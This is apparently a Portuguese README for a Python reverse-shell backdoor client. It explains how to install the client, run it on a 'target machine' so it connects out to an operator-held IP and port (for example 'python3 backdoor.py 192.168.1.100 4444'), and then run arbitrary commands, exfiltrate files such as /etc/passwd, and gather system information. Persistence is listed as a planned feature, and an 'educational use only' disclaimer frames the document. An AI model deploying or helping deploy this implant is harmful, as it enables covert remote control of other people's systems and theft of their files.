# Backdoor Client - Python

Um cliente de backdoor em Python que estabelece uma conexão reversa com um servidor, permitindo execução remota de comandos, transferência de arquivos e controle do sistema.

## ⚠️ Aviso Legal

Este software é fornecido **apenas para fins educacionais e de pesquisa em segurança cibernética**. Utilize-o apenas em:

- Ambientes controlados e autorizados
- Sistemas de propriedade sua ou com permissão explícita por escrito
- Ambientes de laboratório para aprendizado

**O uso não autorizado deste software pode violar leis locais e federais.** Os desenvolvedores não se responsabilizam pelo uso indevido deste software.

## Requisitos

- **Python 3.6+**
- Biblioteca `socket` (incluída na biblioteca padrão do Python)
- Biblioteca `subprocess` (incluída na biblioteca padrão do Python)

##  Instalação

1. Clone o repositório:
```bash
git clone https://github.com/seu-usuario/backdoor-em-python.git
cd backdoor-em-python
```

2. Não há dependências externas necessárias (apenas bibliotecas padrão do Python)

3. Torne o script executável (opcional):
```bash
chmod +x backdoor.py
```

## Funcionalidades

### Funcionalidades Principais

- **Conexão Reversa**: Estabelece conexão TCP com servidor remoto
- **Execução Remota de Comandos**: Executa comandos do sistema operacional
- **Navegação de Diretórios**: Navega pelo sistema de arquivos remoto
- **Download de Arquivos**: Baixa arquivos do sistema remoto
- **Informações do Sistema**: Obtém informações detalhadas do sistema
- **Tratamento de Erros Robusto**: Gerencia erros de forma elegante
- **Buffer Dinâmico**: Suporta comandos e respostas grandes
- **Timeout de Comandos**: Previne travamentos com comandos longos

### Comandos Disponíveis

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `cd <diretório>` | Muda o diretório atual | `cd /home/user` |
| `pwd` | Mostra o diretório atual | `pwd` |
| `sysinfo` | Exibe informações do sistema | `sysinfo` |
| `download <arquivo>` | Faz download de um arquivo | `download /etc/passwd` |
| `<comando>` | Executa qualquer comando do sistema | `ls -la`, `whoami` |
| `q`, `quit`, `exit` | Encerra a conexão | `quit` |

## Uso

### Uso Básico

```bash
python3 backdoor.py <IP_SERVIDOR> <PORTA>
```

### Exemplos

**Conectar a servidor local:**
```bash
python3 backdoor.py 127.0.0.1 4444
```

**Conectar a servidor remoto:**
```bash
python3 backdoor.py 192.168.1.100 8080
```

**Com script executável:**
```bash
./backdoor.py 192.168.1.100 4444
```

### Fluxo de Trabalho

1. **Servidor**: Inicie o servidor backdoor em uma máquina (servidor separado necessário)
2. **Cliente**: Execute este script na máquina alvo para conectar ao servidor
3. **Controle**: Use o servidor para enviar comandos ao cliente

## 🔧 Estrutura do Código

```
backdoor.py
├── BackdoorClient (Classe principal)
│   ├── connect()              # Estabelece conexão
│   ├── receive_command()      # Recebe comandos do servidor
│   ├── execute_command()      # Executa comandos
│   ├── change_directory()     # Navega diretórios
│   ├── download_file()        # Faz download de arquivos
│   ├── get_system_info()      # Obtém info do sistema
│   └── run()                  # Loop principal
└── main()                     # Função principal
```

## Exemplos de Uso

### Obter Informações do Sistema

```bash
# No servidor, envie o comando:
sysinfo

# Resposta esperada:
# === Informações do Sistema ===
# Sistema Operacional: Linux
# Versão: 5.15.0
# Arquitetura: x86_64
# ...
```

### Navegar Diretórios

```bash
# Mudar diretório
cd /home/user/Documents

# Verificar diretório atual
pwd
```

### Executar Comandos

```bash
# Listar arquivos
ls -la

# Ver processos
ps aux

# Verificar usuário atual
whoami

# Ver informações de rede
ifconfig
```

### Download de Arquivos

```bash
# Baixar arquivo
download /etc/passwd

# O servidor receberá o arquivo em formato base64
```

## Segurança

### Considerações de Segurança

- ⚠️ **Sem Criptografia**: A comunicação não é criptografada por padrão
- ⚠️ **Sem Autenticação**: Não há mecanismo de autenticação
- ⚠️ **Portas Aberta**: Requer porta de rede aberta

### Recomendações

Para uso em ambiente de produção ou mais seguro, considere:

1. Adicionar criptografia TLS/SSL
2. Implementar autenticação
3. Usar túneis SSH
4. Implementar logging e auditoria
5. Adicionar rate limiting

## Solução de Problemas

### Problema: "Conexão recusada"

**Solução**: Verifique se o servidor está rodando e a porta está aberta

```bash
# Teste a conexão
telnet <IP_SERVIDOR> <PORTA>
```

### Problema: "Não foi possível resolver o endereço"

**Solução**: Verifique se o IP está correto e acessível

```bash
# Teste conectividade
ping <IP_SERVIDOR>
```

### Problema: Comandos não retornam saída

**Solução**: Alguns comandos podem não produzir saída. Use redirecionamento:

```bash
# No servidor, envie:
ls -la > /tmp/output.txt && cat /tmp/output.txt
```

## Arquitetura

```
┌─────────────┐         TCP Connection         ┌─────────────┐
│   Servidor  │◄───────────────────────────────►│   Cliente   │
│  Backdoor   │                                 │  backdoor.py│
└─────────────┘                                 └─────────────┘
      │                                               │
      │ Comandos                                      │ Executa
      │ Enviados                                      │ Comandos
      │                                               │
      │◄────────────── Respostas Enviadas ───────────┘
```

## 🔄 Melhorias Futuras

- [ ] Suporte a criptografia TLS/SSL
- [ ] Autenticação por chave
- [ ] Suporte a upload de arquivos
- [ ] Interface gráfica (GUI)
- [ ] Suporte multi-cliente
- [ ] Persistência no sistema
- [ ] Comandos assíncronos
- [ ] Compressão de dados

## 📄 Licença

Este projeto é fornecido "como está" para fins educacionais. Veja o arquivo LICENSE para mais detalhes.

## Contribuindo

Contribuições são bem-vindas! Por favor:

1. Faça um fork do projeto
2. Crie uma branch para sua feature (`git checkout -b feature/MinhaFeature`)
3. Commit suas mudanças (`git commit -m 'Adiciona MinhaFeature'`)
4. Push para a branch (`git push origin feature/MinhaFeature`)
5. Abra um Pull Request

## Contato

Para questões ou sugestões, abra uma issue no GitHub.

---

**⚠️ Lembre-se**: Use este software de forma ética e legal. Hacking não autorizado é crime.
